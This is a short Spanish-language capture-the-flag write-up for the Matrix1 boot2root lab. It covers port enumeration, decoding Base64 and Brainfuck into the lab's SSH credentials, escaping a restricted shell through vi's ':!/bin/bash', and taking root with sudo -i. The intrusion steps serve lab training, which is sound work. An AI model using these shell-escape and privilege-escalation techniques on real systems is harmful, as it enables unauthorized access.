# Matrix1 Writeup

## Descripción (traducción)

Matrix es un reto boot2root de nivel intermedio.  
El objetivo es conseguir acceso root y leer /root/flag.txt.  

La máquina usa DHCP, por lo que la IP se asigna automáticamente.

Pista: Sigue tu intuición y enumera.

---

## Enumeración inicial

IP atacante: 192.168.184.128  
IP víctima: 192.168.184.131  

### Escaneo
nmap descubre:
- 22 → SSH
- 80 → HTTP
- 31337 → HTTP alternativo

---

## Web inicial

![img]({files/img1.png})

Mensaje clave:
"Follow the white rabbit"

Esto es una referencia directa a:
- enumeración
- pistas ocultas

---

## Fuzzing

Se encuentra:
- /assets

![img]({files/img4.png})

---

## Hallazgo clave

Imagen:
p0rt_31337.png

![img]({files/img5.png})

Interpretación:
👉 Nos obliga a ir al puerto 31337

---

## Segunda web

![img]({files/img6.png})

---

## Código fuente

Cadena Base64 encontrada.

Decodificada:
echo "texto" > Cypher.matrix

👉 Esto crea un archivo

---

## Descarga

http://IP:31337/Cypher.matrix

---

## Análisis

Archivo contiene Brainfuck.

Traducción:
Usuario: guest  
Password: k1ll0rXX  

---

## Fuerza bruta

Password final:
k1ll0r7n  

---

## Acceso SSH

Shell restringida (rbash)

---

## Escape de rbash

PATH revela:
/home/guest/prog

echo /home/guest/prog/*
→ vi

Exploit:
:!/bin/bash

---

## Fix entorno

export SHELL=bash  
export PATH=/usr/bin:$PATH  

---

## Privilege escalation

sudo -l:
(ALL) ALL  

👉 acceso total

sudo -i

---

## Root

flag encontrada

---

## Conclusión

Puntos clave:
- Enumeración web
- Base64
- Brainfuck
- Escape rbash
- PATH manipulation
- sudo abuse
